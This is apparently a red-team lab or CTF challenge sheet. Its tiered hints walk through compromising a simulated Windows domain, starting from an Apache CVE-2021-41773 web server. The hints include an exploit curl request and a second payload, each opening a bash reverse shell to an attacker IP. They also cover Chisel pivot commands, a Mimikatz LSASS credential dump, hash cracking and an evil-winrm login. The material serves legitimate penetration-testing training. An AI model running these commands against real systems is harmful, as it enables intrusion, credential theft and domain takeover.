# Red‑Team Challenge: Domain Compromise

## Scenario
You are a red‑team operator engaged in a simulated penetration test against **Corp Inc.** The only externally facing asset is a web server at `192.168.1.10`. Your mission is to breach the perimeter, pivot to the internal network, and achieve full domain compromise.

**Time allocated:** 4–8 hours (depending on experience).

## Objectives
1. **Initial Access** – Exploit the web server to gain a foothold.
2. **Privilege Escalation** – Elevate to `root` on the Linux host.
3. **Credential Discovery** – Find stored domain credentials.
4. **Pivoting** – Establish a route into the internal network (`10.0.20.0/24`).
5. **Lateral Movement** – Compromise a Windows 10 workstation.
6. **Credential Harvesting** – Dump hashes from the workstation.
7. **Cracking** – Crack a Domain Admin’s hash.
8. **Domain Takeover** – Authenticate to the Domain Controller and capture the final flag.

## Flags
Flags are plain‑text files placed at key milestones. Submit each flag to prove progress.

| Flag | Location | Description |
|------|----------|-------------|
| **WEB01‑root** | `/root/flag_root.txt` | Obtain `root` on WEB01. |
| **WORKSTATION‑system** | `C:\Windows\System32\flag_system.txt` | Achieve `SYSTEM` on the Windows 10 workstation. |
| **DC‑domain** | `C:\Users\Administrator\Desktop\flag_domain.txt` | Compromise the Domain Controller. |

## Hints

### Stage 1 – Initial Access
<details>
<summary>Hint 1 (Easy)</summary>

The web server is running Apache 2.4.49. Research publicly known vulnerabilities for this version.
</details>

<details>
<summary>Hint 2 (Medium)</summary>

CVE‑2021‑41773 allows path‑traversal to CGI scripts. The server has a CGI endpoint at `/cgi‑bin/`.
</details>

<details>
<summary>Hint 3 (Detailed)</summary>

Craft a request that traverses directories to reach `/bin/sh` and execute a reverse shell. Example:
```bash
curl "http://192.168.1.10/cgi‑bin/../../../..//bin/sh" -d "echo; bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"
```
</details>

### Stage 2 – Privilege Escalation (WEB01)
<details>
<summary>Hint 1 (Easy)</summary>

Check for cron jobs running as root: `cat /etc/crontab`.
</details>

<details>
<summary>Hint 2 (Medium)</summary>

A script at `/usr/local/bin/backup.sh` is executed every minute by root. Check its permissions.
</details>

<details>
<summary>Hint 3 (Detailed)</summary>

Replace `backup.sh` with a reverse‑shell payload (e.g., `bash -i >& /dev/tcp/192.168.1.100/4445 0>&1`) and wait for the cron job to run.
</details>

### Stage 3 – Credential Discovery
<details>
<summary>Hint 1 (Easy)</summary>

Look for credential files in `/root/`.
</details>

<details>
<summary>Hint 2 (Medium)</summary>

`/root/creds.txt` contains a domain user’s credentials in `DOMAIN\USER:PASSWORD` format.
</details>

### Stage 4 – Pivoting
<details>
<summary>Hint 1 (Easy)</summary>

WEB01 has a second network interface. Check `ip addr` to find the internal IP.
</details>

<details>
<summary>Hint 2 (Medium)</summary>

Use a tool like **Chisel** (provided in `/vagrant/tools/`) to create a SOCKS proxy from WEB01 to your attacker machine.
</details>

<details>
<summary>Hint 3 (Detailed)</summary>

On attacker: `./chisel server -p 8000 --reverse &`  
On WEB01: `./chisel client 192.168.1.100:8000 R:socks`  
Then use `proxychains` to scan internal hosts.
</details>

### Stage 5 – Lateral Movement (WORKSTATION)
<details>
<summary>Hint 1 (Easy)</summary>

Use the credentials found earlier (`web_admin:P@ssw0rd`) to authenticate to the Windows workstation via SMB.
</details>

<details>
<summary>Hint 2 (Medium)</summary>

Enumerate shares on `10.0.20.20`. Look for a writable folder that might be used by scheduled tasks.
</details>

<details>
<summary>Hint 3 (Detailed)</summary>

`C:\ProgramData\Tasks` is writable by authenticated users. A scheduled task runs `backup.bat` from that folder every minute as SYSTEM. Replace `backup.bat` with a PowerShell reverse shell.
</details>

### Stage 6 – Credential Harvesting
<details>
<summary>Hint 1 (Easy)</summary>

Once you have SYSTEM, use Mimikatz (provided in `C:\vagrant\tools\`) to dump LSASS secrets.
</details>

<details>
<summary>Hint 2 (Medium)</summary>

Run:
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```
Look for the `backup_admin` user’s NTLM hash.
</details>

### Stage 7 – Cracking
<details>
<summary>Hint 1 (Easy)</summary>

The hash is NTLM. Use `john` or `hashcat` with a wordlist (e.g., `rockyou.txt`).
</details>

<details>
<summary>Hint 2 (Medium)</summary>

The password is a season‑year combination (e.g., `Winter2024!`).
</details>

### Stage 8 – Domain Takeover
<details>
<summary>Hint 1 (Easy)</summary>

Use the cracked password to authenticate to the Domain Controller (`10.0.20.5`) via WinRM.
</details>

<details>
<summary>Hint 2 (Medium)</summary>

`evil‑winrm` (on Kali) works well through the Chisel proxy:
```bash
proxychains evil‑winrm -i 10.0.20.5 -u backup_admin -p 'Winter2024!'
```
</details>

## Scoring (Optional)
If using this lab in a CTF, you can assign points:

| Objective | Points |
|-----------|--------|
| Initial Access (www‑data shell) | 100 |
| WEB01 Privilege Escalation (root) | 200 |
| Credential Discovery | 100 |
| Pivoting (internal network scan) | 150 |
| WORKSTATION Compromise (SYSTEM) | 250 |
| Credential Dumping (hash extraction) | 150 |
| Hash Cracking | 200 |
| Domain Compromise (DC flag) | 300 |
| **Total** | **1450** |

## Notes for Participants
- **Time management:** The first three stages are relatively quick; pivoting and Windows exploitation may take longer.
- **Tool familiarity:** Ensure you are comfortable with Chisel, proxychains, Mimikatz, and hash‑cracking tools before starting.
- **Documentation:** Keep detailed notes—real red‑team engagements require thorough reporting.
- **Ethics:** This lab is for skill development only. Apply these techniques only in authorized environments.